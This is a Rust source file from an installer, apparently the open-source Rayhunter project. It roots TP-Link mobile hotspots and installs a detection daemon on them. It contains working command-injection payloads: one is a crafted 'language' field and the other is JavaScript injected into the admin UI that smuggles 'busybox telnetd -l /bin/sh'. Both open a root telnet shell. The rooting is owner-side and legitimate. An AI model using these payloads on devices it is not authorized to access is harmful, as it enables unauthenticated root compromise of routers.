use std::net::SocketAddr;
use std::str::FromStr;
use std::time::Duration;

use anyhow::{Context, Error};
use axum::{
    Router,
    body::{Body, to_bytes},
    extract::{Request, State},
    http::uri::Uri,
    response::{IntoResponse, Response},
    routing::any,
};
use bytes::{Bytes, BytesMut};
use hyper::StatusCode;
use hyper_util::{client::legacy::connect::HttpConnector, rt::TokioExecutor};
use serde::Deserialize;
use tokio::time::sleep;

use crate::InstallTpLink;
use crate::util::{telnet_send_command, telnet_send_file};

type HttpProxyClient = hyper_util::client::legacy::Client<HttpConnector, Body>;

pub async fn main_tplink(
    InstallTpLink {
        skip_sdcard,
        admin_ip,
        sdcard_path,
    }: InstallTpLink,
) -> Result<(), Error> {
    let is_v3 = start_telnet(&admin_ip).await?;
    tplink_run_install(skip_sdcard, admin_ip, sdcard_path, is_v3).await
}

#[derive(Deserialize)]
struct V3RootResponse {
    result: u64,
}

pub async fn start_telnet(admin_ip: &str) -> Result<bool, Error> {
    let client = reqwest::Client::new();

    println!("Launching telnet on the device");

    for endpoint in [
        // TP-Link M7350 v3
        // https://github.com/advisories/GHSA-ffwq-9r7p-3j6r
        // in particular: https://www.yuque.com/docs/share/fca60ef9-e5a4-462a-a984-61def4c9b132
        format!("http://{admin_ip}/cgi-bin/qcmap_web_cgi"),
        // TP-Link M7310 v1
        // (adaptation of M7350 exploit)
        format!("http://{admin_ip}/cgi-bin/web_cgi"),
    ] {
        let response = client.post(&endpoint)
            .body(r#"{"module": "webServer", "action": 1, "language": "EN';echo $(busybox telnetd -l /bin/sh);echo 1'"}"#)
            .send()
            .await?;

        if response.status() == 404 {
            continue;
        }

        let Ok(V3RootResponse { result }) = response.error_for_status()?.json().await else {
            // On TP-Link M7350 v9, the endpoint /cgi-bin/web_cgi returns 200 OK without launching telnet, and without a response body.
            continue;
        };

        if result != 0 {
            anyhow::bail!("Bad result code when trying to root device: {result}");
        }

        // resetting the language is important because otherwise the tplink's admin interface is
        // unusuable.
        let V3RootResponse { result } = client
            .post(&endpoint)
            .body(r#"{"module": "webServer", "action": 1, "language": "en"}"#)
            .send()
            .await?
            .error_for_status()?
            .json()
            .await?;

        if result != 0 {
            anyhow::bail!("Bad result code when trying to reset the language: {result}");
        }

        println!("Detected hardware revision v3");
        return Ok(true);
    }

    println!("Got a 404 trying to run exploit for hardware revision v3, trying v5 exploit");
    tplink_launch_telnet_v5(admin_ip).await?;

    Ok(false)
}

async fn tplink_run_install(
    skip_sdcard: bool,
    admin_ip: String,
    mut sdcard_path: String,
    is_v3: bool,
) -> Result<(), Error> {
    println!("Connecting via telnet to {admin_ip}");
    let addr = SocketAddr::from_str(&format!("{admin_ip}:23")).unwrap();

    if !skip_sdcard {
        if sdcard_path.is_empty() {
            let try_paths = [
                // TP-Link hardware less than v9.0
                "/media/card",
                // TP-Link hardware v9.0
                "/media/sdcard",
            ];
            for path in try_paths {
                if telnet_send_command(addr, &format!("ls {path}"), "exit code 0", true)
                    .await
                    .is_ok()
                {
                    sdcard_path = path.to_owned();
                    break;
                }
            }

            if sdcard_path.is_empty() {
                anyhow::bail!(
                    "Unable to determine sdcard path. Rayhunter needs a FAT-formatted SD card to function.\n\n\
                    If you already inserted a FAT formatted SD card, this is a bug. Please file an issue with your hardware version.\n\n\
                    The installer has tried to find an empty folder to mount to on these paths: {try_paths:?}\n\
                    ...but none of them exist.\n\n\
                    At this point, you may 'telnet {admin_ip}' and poke around in the device to figure out what went wrong yourself."
                );
            }
        }

        println!("Mounting sdcard on {sdcard_path}");
        if telnet_send_command(
            addr,
            &format!("mount | grep -q {sdcard_path}"),
            "exit code 0",
            true,
        )
        .await
        .is_err()
        {
            telnet_send_command(addr, &format!("mount /dev/mmcblk0p1 {sdcard_path}"), "exit code 0", true).await.context("Rayhunter needs a FAT-formatted SD card to function for more than a few minutes. Insert one and rerun this installer, or pass --skip-sdcard")?;
        } else {
            println!("sdcard already mounted");
        }
    }

    // there is too little space on the internal flash to store anything, but the initrd script
    // expects things to be at this location
    telnet_send_command(addr, "rm -rf /data/rayhunter", "exit code 0", true).await?;
    telnet_send_command(addr, "mkdir -p /data", "exit code 0", true).await?;
    telnet_send_command(
        addr,
        &format!("ln -sf {sdcard_path} /data/rayhunter"),
        "exit code 0",
        true,
    )
    .await?;

    telnet_send_file(
        addr,
        &format!("{sdcard_path}/config.toml"),
        crate::CONFIG_TOML
            .replace("#device = \"orbic\"", "device = \"tplink\"")
            .as_bytes(),
        true,
    )
    .await?;

    let rayhunter_daemon_bin = include_bytes!(env!("FILE_RAYHUNTER_DAEMON"));

    telnet_send_file(
        addr,
        &format!("{sdcard_path}/rayhunter-daemon"),
        rayhunter_daemon_bin,
        true,
    )
    .await?;

    telnet_send_file(
        addr,
        "/etc/init.d/rayhunter_daemon",
        get_rayhunter_daemon(&sdcard_path).as_bytes(),
        true,
    )
    .await?;

    telnet_send_command(
        addr,
        &format!("chmod ugo+x {sdcard_path}/rayhunter-daemon"),
        "exit code 0",
        true,
    )
    .await?;
    telnet_send_command(
        addr,
        "chmod 755 /etc/init.d/rayhunter_daemon",
        "exit code 0",
        true,
    )
    .await?;

    // if the device is not v3, the JS-based root exploit already added rayhunter_daemon as a
    // startup script. tplink v9 does not have update-rc.d, and it was reported that *sometimes* it
    // is unreliable on other hardware revisions too.
    if is_v3 {
        telnet_send_command(
            addr,
            "update-rc.d rayhunter_daemon defaults",
            "exit code 0",
            true,
        )
        .await?;
    }

    println!(
        "Done. Rebooting device. After it's started up again, check out the web interface at http://{admin_ip}:8080"
    );

    telnet_send_command(addr, "reboot", "exit code 0", true).await?;

    Ok(())
}

#[derive(Clone)]
struct AppState {
    client: HttpProxyClient,
    admin_ip: String,
}

async fn handler(state: State<AppState>, mut req: Request) -> Result<Response, StatusCode> {
    let path = req.uri().path();
    let path_query = req
        .uri()
        .path_and_query()
        .map(|v| v.as_str())
        .unwrap_or(path);

    let uri = format!("http://{}{}", state.admin_ip, path_query);

    // on version 5.2, this path is /settings.min.js
    // on other versions, this path is /js/settings.min.js
    let is_settings_js = path.ends_with("/settings.min.js");

    *req.uri_mut() = Uri::try_from(uri).unwrap();

    let mut response = state
        .client
        .request(req)
        .await
        .map_err(|_| StatusCode::BAD_REQUEST)?
        .into_response();

    if is_settings_js {
        let (parts, body) = response.into_parts();
        let data = to_bytes(body, usize::MAX)
            .await
            .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let mut data = BytesMut::from(data);
        // inject some javascript into the admin UI to get us a telnet shell.
        data.extend(br#";window.rayhunterPoll = window.setInterval(() => {
            Globals.models.PTModel.add({applicationName: "rayhunter-root", enableState: 1, entryId: 1, openPort: "2300-2400", openProtocol: "TCP", triggerPort: "$(busybox telnetd -l /bin/sh)", triggerProtocol: "TCP"});
            Globals.models.PTModel.add({applicationName: "rayhunter-daemon", enableState: 1, entryId: 2, openPort: "2400-2500", openProtocol: "TCP", triggerPort: "$(/etc/init.d/rayhunter_daemon start)", triggerProtocol: "TCP"});
            alert("Success! You can go back to the rayhunter installer.");
            window.clearInterval(window.rayhunterPoll);
        }, 1000);"#);
        response = Response::from_parts(parts, Body::from(Bytes::from(data)));
        response.headers_mut().remove("Content-Length");
    }

    Ok(response)
}

async fn tplink_launch_telnet_v5(admin_ip: &str) -> Result<(), Error> {
    let client: HttpProxyClient =
        hyper_util::client::legacy::Client::<(), ()>::builder(TokioExecutor::new())
            .build(HttpConnector::new());

    let app = Router::new()
        .route("/", any(handler))
        .route("/{*path}", any(handler))
        .with_state(AppState {
            client,
            admin_ip: admin_ip.to_owned(),
        });

    let listener = tokio::net::TcpListener::bind("127.0.0.1:4000")
        .await
        .unwrap();

    println!("Listening on http://{}", listener.local_addr().unwrap());
    println!("Please open above URL in your browser and log into the router to continue.");

    let handle = tokio::spawn(async move { axum::serve(listener, app).await });

    let addr = SocketAddr::from_str(&format!("{admin_ip}:23")).unwrap();

    while telnet_send_command(addr, "true", "exit code 0", true)
        .await
        .is_err()
    {
        sleep(Duration::from_millis(1000)).await;
    }

    handle.abort();

    Ok(())
}

fn get_rayhunter_daemon(sdcard_path: &str) -> String {
    // Even though TP-Link eventually auto-mounts the SD card, it sometimes does so too late. And
    // changing the order in which daemons are started up seems to not work reliably.
    //
    // This part of the daemon dynamically generated because we may have to eventually add logic
    // specific to a particular hardware revision here.
    crate::RAYHUNTER_DAEMON_INIT.replace(
        "#RAYHUNTER-PRESTART",
        &format!("mount /dev/mmcblk0p1 {sdcard_path} || true"),
    )
}

#[test]
fn test_get_rayhunter_daemon() {
    let s = get_rayhunter_daemon("/media/card");
    assert!(s.contains("mount /dev/mmcblk0p1 /media/card"));
}
